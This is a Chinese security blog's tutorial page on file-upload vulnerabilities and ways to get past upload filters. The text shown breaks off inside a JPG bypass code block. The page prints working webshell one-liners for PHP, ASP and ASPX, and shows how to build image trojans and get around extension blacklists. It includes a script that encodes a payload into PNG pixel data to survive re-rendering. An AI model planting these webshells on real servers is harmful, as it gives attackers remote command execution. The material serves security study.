<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>文件上传漏洞 | 忆 执 昔 来 的 旅 途</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="Web漏洞文件上传" />
  
  
  
  
  <meta name="description" content="一、文件上传漏洞 1234成因：服务器配置不当导致任意文件上传Web应用对上传的文件没有进行足够的限制程序开发部署时，由于未考虑系统特性或验证而导致限制被绕过">
<meta property="og:type" content="article">
<meta property="og:title" content="文件上传漏洞">
<meta property="og:url" content="https://xizhi-future.github.io/2021/06/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="忆 执 昔 来 的 旅 途">
<meta property="og:description" content="一、文件上传漏洞 1234成因：服务器配置不当导致任意文件上传Web应用对上传的文件没有进行足够的限制程序开发部署时，由于未考虑系统特性或验证而导致限制被绕过">
<meta property="og:locale">
<meta property="og:image" content="https://i.loli.net/2021/06/06/xb6nmztdDVQK1OU.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/MjcNfBp7xGenQhm.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/lNAGfPnQCgqUV6d.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/8Bc72KVLROgbHms.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/UTXBRISzfnHOblm.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/WlvA5nmCS8H7ru4.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/lgyOxavE5J9VbrW.png">
<meta property="og:image" content="c:/Users/yinanping/AppData/Roaming/Typora/typora-user-images/image-20210414193438953.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/KQX49bE83T5svuC.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/xcDiO5rdkplgwCZ.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/CWcPAyVXHQOdsBq.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/XrO9nAwRfjtH1lz.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/QCVYdEzUcjI6bFf.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/pXZrE6JPm8WGdYL.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/4Y59p7Ga2inoFr3.png">
<meta property="og:image" content="d:/images/20210211125111782.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/PTml1WOKonfN6AM.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/LoMvPX1JVKiSQpG.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/HtTUl9YxvQwIghs.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/Fi2MDBhAvXSGP7n.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/JITQ1S2AxD7jtnC.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/b5tGMwF9gikBqX8.png">
<meta property="og:image" content="c:/Users/yinanping/AppData/Roaming/Typora/typora-user-images/image-20210328163331220.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/zBfx3AQkP6esMD9.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/h7EyzfdLjrIct2m.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/JvkRuY3782MtPoc.png">
<meta property="og:image" content="c:/Users/yinanping/AppData/Roaming/Typora/typora-user-images/image-20210328165154004.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/phjEqNax3fRtVru.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/QHtjxzlYNgdpio6.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/JTYPFbagqDoEnOQ.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/ms4VyajKDup3Xxc.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20210323184828923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://image.3001.net/images/20191224/1577156449_5e017f6109e6e.png">
<meta property="og:image" content="https://i.loli.net/2021/06/06/1oe8KlkMph5DTJW.png">
<meta property="article:published_time" content="2021-06-06T14:42:17.000Z">
<meta property="article:modified_time" content="2021-10-08T12:05:09.617Z">
<meta property="article:author" content="xizhi-future">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="漏洞">
<meta property="article:tag" content="文件上传">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/06/06/xb6nmztdDVQK1OU.png">
  
    <link rel="alternate" href="/atom.xml" title="忆 执 昔 来 的 旅 途" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
}

  </style>
  
<link rel="stylesheet" href="/css/style.css">


  
<script src="/js/jquery-3.1.1.min.js"></script>

  
<script src="/js/bootstrap.js"></script>


  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    
<link rel="stylesheet" href="/css/dialog.css">

  

  

  
    <link rel="stylesheet" href="/css/header-post.css" >
  

  
  
  
    <link rel="stylesheet" href="/css/vdonate.css" >
  

<meta name="generator" content="Hexo 5.4.0"></head>



  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  <div id="container">
    <div id="wrap">
      
        <header>

    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
        <div class="navbar-inner">
          
          <div class="container"> 
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
              <span class="sr-only">Toggle navigation</span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>

            
              <a class="brand" style="
                 margin-top: 0px;"  
                href="#" data-toggle="modal" data-target="#myModal" >
                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
              </a>
            
            
            <div class="navbar-collapse collapse">
              <ul class="hnav navbar-nav">
                
                  <li> <a class="main-nav-link" href="/">Home</a> </li>
                
                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
                
                  <li> <a class="main-nav-link" href="/categories">Categories</a> </li>
                
                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
                
                  <li> <a class="main-nav-link" href="/essayists">随笔</a> </li>
                
                  <li> <a class="main-nav-link" href="/playist">音乐</a> </li>
                
                  <li> <a class="main-nav-link" href="/about">About</a> </li>
                
                  <li><div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="" />
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something..." />
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>


</div></li>
            </div>
          </div>
                
      </div>
    </div>

</header>



      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-文件上传漏洞" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" class="article-title" itemprop="name">
      文件上传漏洞
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2021/06/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
	  <time datetime="2021-06-06T14:42:17.000Z" itemprop="datePublished">2021-06-06</time>
	</a>

      
    <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E7%AF%87/">Web漏洞基础篇</a>

      
	<a class="article-views">
	<span id="busuanzi_container_page_pv">
		PV:<span id="busuanzi_value_page_pv"></span>
	</span>
	</a>

      

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="一、文件上传漏洞"><a href="#一、文件上传漏洞" class="headerlink" title="一、文件上传漏洞"></a>一、文件上传漏洞</h1><p><img src="https://i.loli.net/2021/06/06/xb6nmztdDVQK1OU.png" alt="在这里插入图片描述"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">成因：</span><br><span class="line">服务器配置不当导致任意文件上传</span><br><span class="line">Web应用对上传的文件没有进行足够的限制</span><br><span class="line">程序开发部署时，由于未考虑系统特性或验证而导致限制被绕过</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h2 id="1-1-条件"><a href="#1-1-条件" class="headerlink" title="1.1 条件"></a>1.1 条件</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>Web服务器开启了文件上传功能，且上传api（接口）对外开放（Web用户可以访问）</span><br><span class="line"><span class="number">2.</span>Web用户对目标目录具有可写权限，甚至具有执行权限</span><br><span class="line"><span class="number">3.</span>上传的文件可执行，即Web容器可以解析我们上传的脚本</span><br></pre></td></tr></table></figure>
<h2 id="1-2-WebShell"><a href="#1-2-WebShell" class="headerlink" title="1.2 WebShell"></a>1.2 WebShell</h2><blockquote>
<p>计算机科学中，Shell俗称为“壳”，指的是“为使用者提供操作界面”的软件，即命令解释器。相当与Windows系统的cmd.exe，Linux系统中的bash。<br>Webshell本质上是在服务器端可运行的脚本文件，以Web方式（HTTP协议）去通信（传递命令消息）。它是一个网站的后门，后缀名为.php/,asp/.aspx/.jsp等。<br>即Webshell接受来自Web用户的命令，在服务器端执行。</p>
</blockquote>
<h2 id="1-3-小马"><a href="#1-3-小马" class="headerlink" title="1.3 小马"></a>1.3 小马</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35078631/article/details/77743794?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161744278716780269856084%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161744278716780269856084&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-7-77743794.pc_search_result_no_baidu_js&utm_term=jsp++%E5%B0%8F%E9%A9%AC">小马</a></p>
<p><strong>原理：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line"> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line">解释：</span><br><span class="line"><span class="number">1</span>.<span class="meta">&lt;?php</span> <span class="meta">?&gt;</span>--php代码的标识，使服务器按照 php代码去解析</span><br><span class="line"><span class="number">2</span>.@--当执行错误的时候，不会报错</span><br><span class="line"><span class="number">3</span>.<span class="keyword">eval</span>()--把字符串作为 php代码去执行</span><br><span class="line"><span class="number">4</span>.<span class="variable">$_POST</span>--以POST方式获取 cmd参数</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">asp:</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">%</span>eval request(&quot;cmd&quot;)<span class="operator">%</span><span class="operator">&gt;</span></span><br><span class="line">aspx:  </span><br><span class="line"><span class="operator">&lt;</span><span class="operator">%</span>@ Page <span class="keyword">Language</span><span class="operator">=</span>&quot;Jscript&quot;<span class="operator">%</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">%</span>eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;);<span class="operator">%</span><span class="operator">&gt;</span></span><br><span class="line">php:</span><br><span class="line"><span class="operator">&lt;</span>?php <span class="variable">@eval</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>]); ?<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>?php fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),&quot;&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;&quot;); ?<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bylfsj/article/details/101227210">变形一句话</a></p>
<h3 id="工具：中国菜刀"><a href="#工具：中国菜刀" class="headerlink" title="工具：中国菜刀"></a>工具：中国菜刀</h3><p>文件管理：查看，上传，下载，修改，删除，运行exe程序<br>虚拟终端：cmd窗口<br>数据库管理：需要填写相关配置</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>T<span class="operator">&gt;</span>MYSQL<span class="operator">&lt;</span>T<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>H<span class="operator">&gt;</span>localhost<span class="operator">&lt;</span>H<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>U<span class="operator">&gt;</span>root<span class="operator">&lt;</span>U<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>P<span class="operator">&gt;</span>密码<span class="operator">&lt;</span>P<span class="operator">&gt;</span>    为空可不写</span><br><span class="line"><span class="operator">&lt;</span>L<span class="operator">&gt;</span>utf8<span class="operator">&lt;</span>L<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="1-4-黑白名单策略"><a href="#1-4-黑白名单策略" class="headerlink" title="1.4 黑白名单策略"></a>1.4 黑白名单策略</h2><h3 id="URLBlacklist–黑名单"><a href="#URLBlacklist–黑名单" class="headerlink" title="URLBlacklist–黑名单"></a>URLBlacklist–黑名单</h3><p>一律 禁止</p>
<h3 id="URLWhitelist–白名单"><a href="#URLWhitelist–白名单" class="headerlink" title="URLWhitelist–白名单"></a>URLWhitelist–白名单</h3><p>一律 允许</p>
<h1 id="二、防御"><a href="#二、防御" class="headerlink" title="二、防御"></a>二、防御</h1><h2 id="2-1-前端限制与绕过"><a href="#2-1-前端限制与绕过" class="headerlink" title="2.1 前端限制与绕过"></a>2.1 前端限制与绕过</h2><p>例如：检测文件后缀名等  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">方法一：直接修改 JS 代码，或者直接删除表单事件</span><br><span class="line">方法二：先使恶意文件后缀名符合白名单策略，然后 Burp 抓包修改文件后缀名</span><br></pre></td></tr></table></figure>
<h2 id="2-2-服务器端检测"><a href="#2-2-服务器端检测" class="headerlink" title="2.2 服务器端检测"></a>2.2 服务器端检测</h2><h3 id="１-MIME-类型"><a href="#１-MIME-类型" class="headerlink" title="１.MIME 类型"></a>１.MIME 类型</h3><blockquote>
<p><strong>MIME</strong>(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。<br>简单说，就是 不同的文件类型 对应于 不同的应用程序。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.docx 	 	application<span class="operator">/</span>vnd.openxmlformats<span class="operator">-</span>officedocument.wordprocessingml.document</span><br><span class="line">.pdf 	 	application<span class="operator">/</span>pdf</span><br><span class="line">.ppt 	    application<span class="operator">/</span>vnd.ms<span class="operator">-</span>powerpoint</span><br><span class="line">.pptx 	    application<span class="operator">/</span>vnd.openxmlformats<span class="operator">-</span>officedocument.presentationml.presentation</span><br><span class="line">.pdf 	 	application<span class="operator">/</span>pdf</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.gif 	      image<span class="operator">/</span>gif</span><br><span class="line">.htm .html 	  text<span class="operator">/</span>html</span><br><span class="line">.jpeg .jpg 	  image<span class="operator">/</span>jpeg</span><br><span class="line">.js 	      text<span class="operator">/</span>javascript</span><br><span class="line">.png 	 	  image<span class="operator">/</span>png</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.svg 	    image<span class="operator">/</span>svg<span class="operator">+</span>xml</span><br><span class="line">.xml 	 	application<span class="operator">/</span>xml</span><br><span class="line">.rar 	    application<span class="operator">/</span>x<span class="operator">-</span>rar<span class="operator">-</span>compressed</span><br><span class="line">.zip 		application<span class="operator">/</span>zip</span><br></pre></td></tr></table></figure>
<p>HTTP协议中，使用 <code>Content-Type 字段</code> 表示 MIME类型</p>
<h3 id="2-文件内容"><a href="#2-文件内容" class="headerlink" title="2.文件内容"></a>2.文件内容</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getimagesize() 函数:</span><br><span class="line">会测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回 图像的尺寸 以及 文件类型 及图片 高度 与 宽度</span><br><span class="line">成功返回一个数组，失败则返回 <span class="literal">FALSE</span> 并产生一条 E_WARNING 级的错误信息</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exif_imagetype() 函数</span><br></pre></td></tr></table></figure>

<p>该函数相当于检验了上传文件的内容，检测其是否真的是一张图片。此时就不能直接上传 php内容 的文件了。</p>
<h4 id="方法一：制作图片木马"><a href="#方法一：制作图片木马" class="headerlink" title="方法一：制作图片木马"></a>方法一：制作图片木马</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="operator">&lt;</span>?php</span><br><span class="line">phpinfo();</span><br><span class="line">?<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">图片合并：</span><br><span class="line">命令：</span><br><span class="line"><span class="keyword">copy</span> <span class="number">1.</span>jpg<span class="operator">/</span>b<span class="operator">+</span>phpinfo.php<span class="operator">/</span>a hack.jpg</span><br><span class="line">以二进制的方式打开，写入文件</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">写入到  版权   当中</span><br></pre></td></tr></table></figure>
<h4 id="方法二：文件幻术–十六进制编辑器"><a href="#方法二：文件幻术–十六进制编辑器" class="headerlink" title="方法二：文件幻术–十六进制编辑器"></a>方法二：文件幻术–十六进制编辑器</h4><p>为了更方便的区别不同文件的类型，相同类型的文件最开头有着相同的字节。<br>| 后缀名 | 文件头                                          |<br>| —— | ———————————————– |<br>| .gif   | 47 49 46 38 39 61 F1 00 2C 01 F7 00 00 64 32 33 |<br>| .jpg   | FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 01 2C |<br>| .png   | 89 50 4E 47 0D 0A 1A 0A 00 00 00 00 49 48 44 52 |</p>
<p>Hex-&gt;Ascii</p>
<h4 id="方法三：属性版本-直接加一句话"><a href="#方法三：属性版本-直接加一句话" class="headerlink" title="方法三：属性版本 直接加一句话"></a>方法三：属性版本 直接加一句话</h4><h4 id="方法四：010Editor-直接加一句话"><a href="#方法四：010Editor-直接加一句话" class="headerlink" title="方法四：010Editor 直接加一句话"></a>方法四：010Editor 直接加一句话</h4><p>相当于方法三</p>
<h3 id="3-后缀名–黑白名单策略"><a href="#3-后缀名–黑白名单策略" class="headerlink" title="3.后缀名–黑白名单策略"></a>3.后缀名–黑白名单策略</h3><p><strong>黑名单：寻找其它可允许上传的类型去绕过限制</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.php .php2 .php3 .php5 .phtml</span><br><span class="line">.asp .aspx .ascx .ashx .asa .cer</span><br><span class="line">.jsp .jspx</span><br></pre></td></tr></table></figure>
<h3 id="4-二次渲染"><a href="#4-二次渲染" class="headerlink" title="4.二次渲染"></a>4.二次渲染</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-13">参考1</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/forforever/p/13191999.html">参考2</a></p>
<p>就是将用户上传的图片重新生成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">basename() 函数返回路径中的文件名部分</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;/testweb/home.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> basename(<span class="variable">$path</span>);</span><br><span class="line"><span class="comment">//显示不带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> basename(<span class="variable">$path</span>,<span class="string">&quot;.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">输出：</span><br><span class="line">home.php</span><br><span class="line">home</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">imagecreatefromjpeg(filename)：由原文件路径生成一个信心的图像</span><br><span class="line">filename</span><br><span class="line">    JPEG 图像的路径。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bool imagejpeg ( resource image [, string filename [, int quality]] ) </span><br><span class="line"></span><br><span class="line">imagejpeg() 从 image 图像以 filename 为文件名创建一个 JPEG 图像。image 参数是 imagecreatefromjpeg 等函数的返回值。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unlink(filename,context) :函数删除文件</span><br><span class="line">若成功，则返回 <span class="literal">true</span>，失败则返回 <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h4 id="方法一：gif-绕过"><a href="#方法一：gif-绕过" class="headerlink" title="方法一：gif 绕过"></a>方法一：gif 绕过</h4><p>使用 010将gif图片的最后加上一句话，上传之后，将上传之后的图片下载下来，再次打开010查看，发现原本我们写入的一句话已经消失了。</p>
<p>但与之前的图片进行对照，仍有未经渲染（改变）的部分，我们可以讲一句话写入不会被渲染的部分进行上传即可。</p>
<p>图片末尾加一句话</p>
<p><img src="https://i.loli.net/2021/06/06/MjcNfBp7xGenQhm.png" alt="image-20210414185051946"></p>
<p>经过渲染，一句话消失</p>
<p><img src="https://i.loli.net/2021/06/06/lNAGfPnQCgqUV6d.png" alt="image-20210414185127873"></p>
<p>找到未经渲染的部分，加一句话，上传</p>
<p><img src="https://i.loli.net/2021/06/06/8Bc72KVLROgbHms.png" alt="image-20210414185805640"></p>
<p>未被渲染掉</p>
<p><img src="https://i.loli.net/2021/06/06/UTXBRISzfnHOblm.png" alt="image-20210414185908992"></p>
<h4 id="方法二：png绕过"><a href="#方法二：png绕过" class="headerlink" title="方法二：png绕过"></a>方法二：png绕过</h4><p>png图片由三个以上的数据块组成</p>
<p>两种类型的数据块：</p>
<p>1)关键数据块</p>
<p>2)辅助数据块：PLTE</p>
<p><strong>方法一：写入IDAT数据块</strong></p>
<p>1)直接在本地运行脚本，生成1.png图片</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, </span><br><span class="line">0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, </span><br><span class="line">0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, </span><br><span class="line">0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, </span><br><span class="line">0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, </span><br><span class="line">0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, </span><br><span class="line">0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, </span><br><span class="line">0x66, 0x44, 0x50, 0x33); </span><br><span class="line">$img = imagecreatetruecolor(32, 32); </span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; </span><br><span class="line">$r = $p[$y]; </span><br><span class="line">$g = $p[$y+1]; </span><br><span class="line">$b = $p[$y+2]; </span><br><span class="line">$color = imagecolorallocate($img, $r, $g, $b); </span><br><span class="line">imagesetpixel($img, round($y / 3), 0, $color); </span><br><span class="line">&#125;</span><br><span class="line">imagepng($img,&#x27;./1.png&#x27;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/06/06/WlvA5nmCS8H7ru4.png" alt="image-20210414191820833"></p>
<p><strong>方法二：写入PLTE数据块</strong></p>
<h4 id="方法三：jpg绕过"><a href="#方法三：jpg绕过" class="headerlink" title="方法三：jpg绕过"></a>方法三：jpg绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 